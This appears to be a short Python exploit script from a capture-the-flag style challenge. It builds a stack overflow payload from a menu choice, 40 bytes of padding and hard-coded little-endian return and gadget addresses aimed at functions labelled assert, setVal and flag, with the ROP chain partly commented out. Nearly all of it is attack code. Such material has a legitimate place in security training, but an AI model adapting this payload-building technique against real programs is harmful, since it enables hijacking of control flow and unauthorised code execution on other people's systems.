#python -c "print '1\n' + 'A'*40 + '\xd7\x07\x40\x00\x00\x00\x00\x00'+ '\xec\x07\x40\x00\x00\x00\x00\x00'+'\x2c\x08\x40\x00\x00\x00\x00\x00'">pay3.txt
#">pay3.txt

option = "1\n"
pad = "A"*40
asser = '\xd7\x07\x40\x00\x00\x00\x00\x00'
setVal = "\xec\x07\x40\x00\x00\x00\x00\x00"
flag = "\x2c\x08\x40\x00\x00\x00\x00\x00"
#gadget1 = "0x0000000000400a93"
gadget1 = "\x93\x0a\x40\x00\x00\x00\x00\x00"
#gadget2 = "0x0000000000400a90"
gadget2 = "\x90\x0a\x40\x00\x00\x00\x00\x00"
#gadget3 = "0x0000000000400a91"
gadget3 = "\x91\x0a\x40\x00\x00\x00\x00\x00"
#arg1 = "0xdeadbeef"
arg1 = "\xef\xbe\xad\xde"
#arg2 = "0xdeadcode"
arg2 = "CCCC"
#arg3 = "0xdeadcode"
arg3 = "BBBB"

payload = option+pad+asser#+gadget1+arg1+setVal+gadget2+arg2+arg3+flag

print(payload)
